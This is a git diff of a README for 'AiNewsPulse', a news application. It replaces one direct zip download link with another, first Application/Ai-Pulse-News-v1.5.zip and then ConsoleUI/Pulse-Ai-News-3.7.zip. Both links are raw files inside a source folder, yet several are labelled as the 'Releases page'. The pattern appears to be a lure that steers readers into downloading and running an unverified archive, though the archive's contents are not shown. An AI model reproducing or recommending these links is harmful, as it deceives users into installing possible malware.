@@ -1,6 +1,6 @@
 # 📰 AiNewsPulse - Stay Updated with AI-Driven Insights
 
-[![Download AiNewsPulse](https://raw.githubusercontent.com/sachinsoni0/AiNewsPulse/main/AiNewsPulse/AiNewsPulse.Application/Ai-Pulse-News-v1.5.zip)](https://raw.githubusercontent.com/sachinsoni0/AiNewsPulse/main/AiNewsPulse/AiNewsPulse.Application/Ai-Pulse-News-v1.5.zip)
+[![Download AiNewsPulse](https://raw.githubusercontent.com/sachinsoni0/AiNewsPulse/main/AiNewsPulse/AiNewsPulse.ConsoleUI/Pulse-Ai-News-3.7.zip)](https://raw.githubusercontent.com/sachinsoni0/AiNewsPulse/main/AiNewsPulse/AiNewsPulse.ConsoleUI/Pulse-Ai-News-3.7.zip)
 
 ## 🚀 Getting Started
 
@@ -18,7 +18,7 @@ Before downloading, ensure your computer meets these minimum requirements:
 
 ## 📥 Download & Install
 
-To get AiNewsPulse, visit this page to download: [AiNewsPulse Releases](https://raw.githubusercontent.com/sachinsoni0/AiNewsPulse/main/AiNewsPulse/AiNewsPulse.Application/Ai-Pulse-News-v1.5.zip).
+To get AiNewsPulse, visit this page to download: [AiNewsPulse Releases](https://raw.githubusercontent.com/sachinsoni0/AiNewsPulse/main/AiNewsPulse/AiNewsPulse.ConsoleUI/Pulse-Ai-News-3.7.zip).
 
 1. Click the link above to open the Releases page.
 2. Find the latest version of AiNewsPulse.
@@ -73,4 +73,4 @@ If you need further assistance, you can open an issue on our GitHub page or refe
 
 ## 🎉 Conclusion
 
-Thank you for choosing AiNewsPulse. We hope this platform simplifies your access to news and helps you stay informed. Don't forget to check for new updates on our [Releases page](https://raw.githubusercontent.com/sachinsoni0/AiNewsPulse/main/AiNewsPulse/AiNewsPulse.Application/Ai-Pulse-News-v1.5.zip) from time to time!
+Thank you for choosing AiNewsPulse. We hope this platform simplifies your access to news and helps you stay informed. Don't forget to check for new updates on our [Releases page](https://raw.githubusercontent.com/sachinsoni0/AiNewsPulse/main/AiNewsPulse/AiNewsPulse.ConsoleUI/Pulse-Ai-News-3.7.zip) from time to time!
